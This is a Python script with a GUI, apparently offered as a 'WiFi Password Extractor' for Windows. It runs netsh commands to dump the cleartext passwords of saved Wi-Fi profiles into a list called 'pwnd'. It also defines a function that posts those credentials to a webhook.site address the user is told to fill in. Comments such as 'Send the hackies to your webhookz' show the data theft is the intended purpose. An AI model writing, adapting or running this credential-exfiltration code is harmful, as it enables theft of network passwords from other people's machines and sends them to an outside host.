import subprocess, os, sys, requests, re, urllib
import customtkinter as ctk


ctk.set_appearance_mode('dark')
ctk.set_default_color_theme('green')


# Replace with your webhook
url = 'https://webhook.site/###################'

# Lists and regex
found_ssids = []
pwnd = []
wlan_profile_regex = r"All User Profile\s+:\s(.*)$"
wlan_key_regex = r"Key Content\s+:\s(.*)$"

#Use Python to execute Windows command
get_profiles_command = subprocess.run(["netsh", "wlan", "show", "profiles"], stdout=subprocess.PIPE).stdout.decode()


#Append found SSIDs to list
def ssid_to_list():
    matches = re.finditer(wlan_profile_regex, get_profiles_command, re.MULTILINE)
    for match in matches:
        for group in match.groups():
            found_ssids.append(group.strip())
    for ssid in found_ssids:
        label = ctk.CTkLabel(scf, text=ssid, font=ctk.CTkFont(size=12,weight="bold"))
        label.pack()


#Get cleartext password for found SSIDs and place into pwnd list
def get_cleartext_password():
    for ssid in found_ssids:
        get_keys_command = subprocess.run(["netsh", "wlan", "show", "profile", ("%s" % (ssid)), "key=clear"], stdout=subprocess.PIPE).stdout.decode()
        matches = re.finditer(wlan_key_regex, get_keys_command, re.MULTILINE)
        for match in matches:
            for group in match.groups():
                pwnd.append({"SSID":ssid,"Password":group.strip()})


    for scf_child in scf.winfo_children():
        scf_child.destroy()
        
    for pwnd_ssid in pwnd:
        entry = "SSID: %s,\t\t\t PASSWORD: %s" % (pwnd_ssid["SSID"], pwnd_ssid["Password"])
        label2 = ctk.CTkLabel(scf, text=entry, font=ctk.CTkFont(size=12,weight="bold"))
        label2.pack()


#Check if any pwnd Wi-Fi exists, if not exit
def check_wifi_exists():
    if len(pwnd) == 0:
        print("No Wi-Fi profiles found. Exiting...")
        sys.exit()
    else:
        print("Wi-Fi profiles found. Check your webhook...")


#Send the hackies to your webhookz
def send_to_webhook():
    final_payload = ""
    for pwnd_ssid in pwnd:
        print("SSID: %s, PASSWORD: %s" % (pwnd_ssid["SSID"], pwnd_ssid["Password"]))
        final_payload += "[SSID:%s, Password:%s]\n" % (pwnd_ssid["SSID"], pwnd_ssid["Password"]) # Payload display format can be changed as desired
        r = requests.post(url, params="format=json", data=final_payload)


root = ctk.CTk()
root.geometry("720x640")
root.title("Windows-WiFi-Extractor (dielnovVersion)")

lb = ctk.CTkLabel(root, text="WindowsOS WiFi Password Extractor", font=ctk.CTkFont(size=30,weight="bold"))
lb.pack(padx=20, pady=(20,10))

scf = ctk.CTkScrollableFrame(root, width=640, height=320)
scf.pack()

btn_list_ssid = ctk.CTkButton(root, text="LIST SSIDs", width=500, command=ssid_to_list)
btn_list_ssid.pack(pady=20)


btn_extract_passwords = ctk.CTkButton(root, text="EXTRACT PWDS", width=500, command=get_cleartext_password)
btn_extract_passwords.pack(pady=20)

save_btn = ctk.CTkButton(root, text="SAVE", width=500)
save_btn.pack(pady=20)


root.mainloop()



